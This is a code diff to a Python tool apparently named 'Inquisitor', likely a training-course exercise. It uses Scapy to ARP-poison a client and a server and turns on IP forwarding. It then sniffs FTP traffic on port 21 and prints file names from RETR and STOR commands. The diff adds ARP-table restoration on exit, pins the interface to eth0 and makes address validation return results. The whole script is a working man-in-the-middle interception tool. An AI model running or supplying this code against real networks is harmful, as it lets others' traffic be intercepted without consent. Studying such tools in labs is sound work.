@@ -14,21 +14,31 @@ class Inquisitor():
         self.mac_addr_serv = argument[4]
         print(f"Constructor, inquisition set : {self.mac_addr_host} + {self.ip_addr_host} + {self.mac_addr_serv} + {self.ip_addr_serv}")
 
+    def restore(self):
+        print("# -- Restoring ARP tables -- #")
+        # Restore client #
+        restore_client = Ether(dst=self.mac_addr_host) / ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv, hwsrc=self.mac_addr_serv)                  
+        # Restore server #
+        restore_serv = Ether(dst=self.mac_addr_serv) / ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host, hwsrc=self.mac_addr_host)
+        # Sending through the Network #
+        send(restore_client, verbose=False, iface="eth0")
+        send(restore_serv, verbose=False, iface="eth0")
+
     def send_poison(self):
         # Lying to the client #
         poison_client = Ether(dst=self.mac_addr_host) / ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv)
         # Lying to the server #
         poison_serv = Ether(dst=self.mac_addr_serv) / ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host)
         # Sending through the Network #
-        send(poison_client, verbose=False)
-        send(poison_serv, verbose=False)
+        send(poison_client, verbose=False, iface="eth0")
+        send(poison_serv, verbose=False, iface="eth0")
 
     def packet_callback(self, packet):
         if(packet.haslayer(Raw)):
             try:
                 payload = packet[Raw].load.decode('utf-8', errors='ignore')
                 if "RETR" in payload or "STOR" in payload:
-                    print(f"[*] File founded : {payload.strip()}")
+                    print(f"# -- File founded : {payload.strip()} -- #")
             except:
                 pass
 
@@ -36,12 +46,13 @@ class Inquisitor():
         print("[*] Starting port forwording")
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
         try:
-            print("[*] Initalise the poison loop")
+            print("# -- Initalise the poison loop -- #")
             while True:
                 self.send_poison()
-                sniff(filter="tcp port 21", prn=self.packet_callback, store=0, timeout=2)
+                sniff(filter="tcp port 21", prn=self.packet_callback, store=0, timeout=2, iface="eth0")
         except KeyboardInterrupt :
-            print("[*] Poison loop has been manually stopped")
+            print("# -- Poison loop has been manually stopped -- #")
+            self.restore()
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
     def verify_addr(self):
@@ -52,11 +63,13 @@ class Inquisitor():
             print("Ipv4 are valid!")
             if not re.match(pattern, self.mac_addr_host) or not re.match(pattern, self.mac_addr_serv):
                 print("ERROR")
-                return
+                return False
             print("MacAddress are valid!")
+            return True
             
         except Exception as e:
             print(f"[ERROR], {e}")
+            return False
 
 
     def poisoning(self):
@@ -68,7 +81,9 @@ def main():
         print("[ERROR, not enought args]")
         return
     inquisition = Inquisitor(sys.argv)
-    inquisition.verify_addr()
+    if not inquisition.verify_addr(): 
+        print("[ERROR], the data you initialise are not valid")
+        return
     inquisition.run()
     
 
